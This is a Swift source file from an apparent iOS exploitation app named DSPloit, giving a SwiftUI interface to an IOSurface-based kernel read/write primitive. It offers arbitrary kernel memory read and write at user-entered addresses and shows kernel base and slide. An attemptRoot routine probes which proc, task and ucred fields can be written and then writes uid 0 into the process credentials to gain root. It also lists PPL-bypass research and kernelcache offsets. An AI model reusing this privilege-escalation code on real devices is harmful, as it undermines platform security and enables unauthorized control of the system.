//
//  BleedingEdgeIOSurfaceKRW.swift
//  DSPloit
//
//  IOSurface KRW Research & Exploitation View
//  Created by Royan
//

import SwiftUI

struct BleedingEdgeIOSurfaceKRWView: View {
    @ObservedObject private var engine = IOSurfaceKRWEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var resultMsg = ""
    @State private var gxfReport = ""
    @State private var dmaReport = ""
    @State private var readAddr = ""
    @State private var readResult = ""
    @State private var writeAddr = ""
    @State private var writeVal = ""
    @State private var writeResult = ""
    @State private var rootResult = ""
    
    var body: some View {
        List {
            // Status
            Section(header: HeaderLabel(text: "IOSurface KRW Status", icon: "cpu")) {
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Kernel")
                    Spacer()
                    StatusIndicator(active: mgr.sbxready, label: "Sandbox")
                    Spacer()
                    StatusIndicator(active: engine.isReady, label: "IOSurface")
                }
                
                if engine.surfaceID != 0 {
                    VStack(alignment: .leading, spacing: 4) {
                        InfoRow(label: "Surface ID", value: "\(engine.surfaceID)", color: .cyan)
                        InfoRow(label: "Mapped Addr", value: String(format: "0x%llx", engine.mappedAddress), color: .green)
                    }
                }
            }
            
            // Initialize
            Section(header: HeaderLabel(text: "Initialize", icon: "bolt.fill")) {
                Button(action: {
                    let result = engine.openIOSurfaceRoot()
                    resultMsg = result.message
                }) {
                    HStack {
                        Image(systemName: "play.circle.fill")
                        Text("Open IOSurfaceRoot")
                        Spacer()
                        if engine.isReady {
                            Image(systemName: "checkmark.circle.fill")
                                .foregroundStyle(.green)
                        }
                    }
                }
                .disabled(!mgr.dsready || !mgr.sbxready)
                
                if !mgr.sbxready {
                    PlainAlert(
                        title: "Requires Sandbox Escape",
                        icon: "lock.fill",
                        text: "Run sandbox escape first (Main tab → Initialize System)",
                        color: .orange
                    )
                }
            }
            
            // Quick Address Buttons (tap to copy or auto-fill)
            Section(header: HeaderLabel(text: "Quick Addresses (tap to paste)", icon: "doc.on.clipboard")) {
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernbase)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_base")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernbase))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.cyan)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernslide)
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_slide")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernslide))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.orange)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let proc = ds_get_our_proc()
                    let addr = String(format: "0x%llx", proc)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_proc")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_proc()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let task = ds_get_our_task()
                    let addr = String(format: "0x%llx", task)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_task")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_task()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
            }
            
            // Read Test
            Section(header: HeaderLabel(text: "Memory Read (via IOSurface)", icon: "magnifyingglass")) {
                TextField("Address (hex)", text: $readAddr)
                    .font(.system(.body, design: .monospaced))
                
                Button("Read 8 bytes") {
                    guard let addr = UInt64(readAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    let val = engine.propertyRead(address: addr)
                    readResult = String(format: "0x%llx = 0x%016llx", addr, val)
                }
                .disabled(!mgr.dsready)
                
                if !readResult.isEmpty {
                    Text(readResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(.green)
                        .textSelection(.enabled)
                }
            }
            
            // Write Test
            Section(header: HeaderLabel(text: "Memory Write", icon: "pencil.line")) {
                TextField("Write Address (hex)", text: $writeAddr)
                    .font(.system(.body, design: .monospaced))
                TextField("Value (hex)", text: $writeVal)
                    .font(.system(.body, design: .monospaced))
                
                Button("Write 8 bytes") {
                    guard let addr = UInt64(writeAddr.replacingOccurrences(of: "0x", with: ""), radix: 16),
                          let val = UInt64(writeVal.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    engine.propertyWrite(address: addr, value: val)
                    // Read back to verify
                    let readBack = engine.propertyRead(address: addr)
                    writeResult = String(format: "Wrote 0x%llx → 0x%llx\nRead back: 0x%016llx\n%@",
                                        val, addr, readBack,
                                        readBack == val ? "✅ SUCCESS" : "❌ BLOCKED (PPL?)")
                }
                .disabled(!mgr.dsready)
                .foregroundStyle(.red)
                
                if !writeResult.isEmpty {
                    Text(writeResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(writeResult.contains("SUCCESS") ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // One-tap Root Attempt
            Section(header: HeaderLabel(text: "⚡ Root Escalation Test", icon: "bolt.shield.fill")) {
                Button(action: attemptRoot) {
                    HStack {
                        Image(systemName: "person.badge.key.fill")
                        Text("Attempt uid=0 (Root)")
                        Spacer()
                        Image(systemName: "exclamationmark.triangle.fill")
                            .foregroundStyle(.orange)
                    }
                    .foregroundStyle(.red)
                }
                .disabled(!mgr.dsready)
                
                if !rootResult.isEmpty {
                    Text(rootResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(rootResult.contains("SUCCESS") ? .green : .orange)
                        .textSelection(.enabled)
                }
                
                Text("Writes uid=0 to ucred. PPL may block this.")
                    .font(.caption2)
                    .foregroundStyle(.secondary)
            }
            
            // Research: GXF Entry
            Section(header: HeaderLabel(text: "GXF Entry Research", icon: "shield.lefthalf.filled")) {
                Button("Generate GXF Report") {
                    gxfReport = engine.researchGXFEntry()
                }
                
                if !gxfReport.isEmpty {
                    Text(gxfReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.cyan)
                        .textSelection(.enabled)
                }
            }
            
            // Research: DMA Bypass
            Section(header: HeaderLabel(text: "DMA PPL Bypass Research", icon: "bolt.shield")) {
                Button("Generate DMA Report") {
                    dmaReport = engine.researchDMABypass()
                }
                
                if !dmaReport.isEmpty {
                    Text(dmaReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.orange)
                        .textSelection(.enabled)
                }
            }
            
            // Kernelcache Analysis Results
            Section(header: HeaderLabel(text: "Kernelcache Findings", icon: "doc.text.magnifyingglass")) {
                VStack(alignment: .leading, spacing: 6) {
                    Text("From deep_analyze_v3.py:")
                        .font(.caption.bold())
                    
                    InfoRow(label: "IOSurface strings", value: "762", color: .cyan)
                    InfoRow(label: "PPL checks (bit#14)", value: "223", color: .red)
                    InfoRow(label: "GXF accesses", value: "50", color: .orange)
                    InfoRow(label: "pmap functions", value: "7 with PPL checks", color: .purple)
                    
                    Text("\nKey addresses (file offsets):")
                        .font(.caption.bold())
                    
                    Group {
                        Text("GXF handler: 0xf0c440")
                        Text("PPL check #1: 0xe33e14")
                        Text("pmap_enter: 0x11126c0 (667 branches)")
                        Text("IOSurfaceRoot: 0x0067d03b (string)")
                        Text("Largest func: 0x155e280 (106KB)")
                    }
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundStyle(.green)
                }
            }
            
            // Result
            if !resultMsg.isEmpty {
                Section(header: HeaderLabel(text: "Result", icon: "info.circle")) {
                    Text(resultMsg)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(engine.isReady ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section(header: HeaderLabel(text: "Log", icon: "terminal")) {
                    ForEach(engine.statusLog.suffix(20), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                }
            }
        }
        .navigationTitle("IOSurface KRW")
        .premiumStyling()
    }
    
    private func attemptRoot() {
        guard mgr.dsready else {
            rootResult = "Kernel not ready"
            return
        }
        
        let proc = ds_get_our_proc()
        guard proc != 0 else { rootResult = "proc = 0"; return }
        let task = ds_get_our_task()
        guard task != 0 else { rootResult = "task = 0"; return }
        
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        let origUid = ds_kread32(ucred + 0x18)
        let crLabel = ds_kread64(ucred + 0x78)
        
        var report = ""
        report += String(format: "proc:      0x%llx\n", proc)
        report += String(format: "task:      0x%llx\n", task)
        report += String(format: "proc_ro:   0x%llx\n", procRo)
        report += String(format: "ucred:     0x%llx\n", ucred)
        report += String(format: "cr_label:  0x%llx\n", crLabel)
        report += String(format: "orig uid:  %d\n\n", origUid)
        
        // ============================================================
        // EXPERIMENT: Explore what we CAN write
        // We know sandbox label write works (sandbox escape proves it)
        // Let's map exactly what's writable vs PPL-blocked
        // Only use addresses already proven readable
        // ============================================================
        
        report += "=== WRITABILITY MAP ===\n"
        report += "(write original value back, check if it sticks)\n\n"
        
        // Test each known address
        let tests: [(String, UInt64)] = [
            ("proc+0x00 (list_next)", proc),
            ("proc+0x08 (list_prev)", proc + 0x08),
            ("proc+0x10", proc + 0x10),
            ("proc+0x18 (proc_ro ptr)", proc + UInt64(off_proc_p_proc_ro)),
            ("proc+0x2c (p_uid)", proc + 0x2c),
            ("task+0x00", task),
            ("task+0x08", task + 0x08),
            ("ucred+0x00", ucred),
            ("ucred+0x08", ucred + 0x08),
            ("ucred+0x18 (cr_uid)", ucred + 0x18),
            ("ucred+0x78 (cr_label)", ucred + 0x78),
            ("proc_ro+0x00", procRo),
            ("proc_ro+0x08", procRo + 0x08),
            ("proc_ro+0x20 (ucred ptr)", procRo + UInt64(off_proc_ro_p_ucred)),
        ]
        
        var writableAddrs: [(String, UInt64)] = []
        
        for (name, addr) in tests {
            let orig = ds_kread64(addr)
            // Write same value back (safe — no actual change)
            ds_kwrite64(addr, orig)
            let verify = ds_kread64(addr)
            let writable = (verify == orig)  // If we can read it back, write path works
            
            // Now try writing a DIFFERENT value (the real test)
            let testVal = orig ^ 0x1  // Flip lowest bit
            ds_kwrite64(addr, testVal)
            let afterWrite = ds_kread64(addr)
            let reallyWritable = (afterWrite == testVal)
            
            // Restore immediately
            if reallyWritable {
                ds_kwrite64(addr, orig)
            }
            
            let status = reallyWritable ? "✅ WRITABLE" : "❌ BLOCKED"
            report += String(format: "  %@: %@ (0x%llx)\n", name, status, orig)
            
            if reallyWritable {
                writableAddrs.append((name, addr))
            }
        }
        
        report += String(format: "\nWritable: %d / %d fields\n\n", writableAddrs.count, tests.count)
        
        // ============================================================
        // SUMMARY
        // ============================================================
        
        report += "=== WRITABLE FIELDS ===\n"
        for (name, addr) in writableAddrs {
            report += String(format: "  %@ (0x%llx)\n", name, addr)
        }
        
        if writableAddrs.isEmpty {
            report += "  (none — all PPL blocked)\n"
        }
        
        report += "\n=== ANALYSIS ===\n"
        let procWritable = writableAddrs.contains { $0.0.contains("proc+") }
        let taskWritable = writableAddrs.contains { $0.0.contains("task+") }
        let ucredWritable = writableAddrs.contains { $0.0.contains("ucred+") && $0.0.contains("cr_uid") }
        let procRoWritable = writableAddrs.contains { $0.0.contains("proc_ro+") }
        
        report += "proc struct: \(procWritable ? "WRITABLE" : "MIXED/BLOCKED")\n"
        report += "task struct: \(taskWritable ? "WRITABLE" : "BLOCKED")\n"
        report += "ucred uid:   \(ucredWritable ? "WRITABLE ← ROOT POSSIBLE!" : "BLOCKED (PPL)")\n"
        report += "proc_ro:     \(procRoWritable ? "WRITABLE" : "BLOCKED (PPL)")\n"
        
        if ucredWritable {
            report += "\n🎉 ucred IS writable! Attempting root...\n"
            ds_kwrite32(ucred + 0x18, 0)
            ds_kwrite32(ucred + 0x1c, 0)
            let newUid = getuid()
            report += String(format: "getuid() = %d\n", newUid)
            if newUid == 0 {
                report += "🎉🎉🎉 ROOT! 🎉🎉🎉\n"
            }
        }
        
        report += "\n=== DONE ===\n"
        rootResult = report
    }
}
